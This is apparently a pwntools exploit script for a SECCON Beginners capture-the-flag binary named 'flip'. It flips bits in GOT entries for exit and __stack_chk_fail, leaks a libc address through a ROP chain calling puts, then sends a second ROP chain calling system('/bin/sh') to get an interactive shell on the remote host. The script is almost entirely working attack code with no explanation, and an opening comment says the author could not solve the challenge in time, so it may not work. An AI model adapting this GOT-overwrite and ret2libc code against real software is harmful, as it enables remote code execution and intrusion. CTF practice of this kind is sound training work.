# cant solve on time


from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './flip'
HOST = 'flip.quals.beginners.seccon.jp'
PORT = 17539

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r = start()

def flip(addr, bit0, bit1):
    r.sendlineafter('address >> ', str(addr))
    r.sendlineafter(') >> ', str(bit0))
    r.sendlineafter(') >> ', str(bit1))


rdi = 0x4009e3


# 0x6d6 -> 0x6e6
flip(elf.got.exit, 5, 4) 

# 0x6e6 -> 0x6e0
flip(elf.got.exit, 1, 2) 

# __stack_chk_fail -> getlong
# 0x0x400676 -> 0x400945
flip(elf.got.__stack_chk_fail, 1, 0) 
flip(elf.got.__stack_chk_fail, 4, 5) 
flip(elf.got.__stack_chk_fail+1, 1, 0) 
flip(elf.got.__stack_chk_fail+1, 3, 2) 

if args.D:
    debug(r, [0x90c])
# got.exit -> got.stack_chk_fail
# 0x6e0 -> 0x670
flip(elf.got.exit, 4, 7) 


payload = ''
payload += flat(rdi, elf.got.puts, elf.plt.puts, elf.sym._start)
r.sendafter('Done!\n', payload[:-1])
leak = u64(r.recvuntil('\n')[:-1] + '\x00' * 2)
dbg("leak")
base = leak - 0x809c0
system = base + 0x4f440
binsh = base + 0x1b3e9a

# waste
flip(elf.got.exit, 0, 0) 

payload = ''
payload += flat(rdi, binsh, system)
r.send(payload)

r.interactive()
r.close()
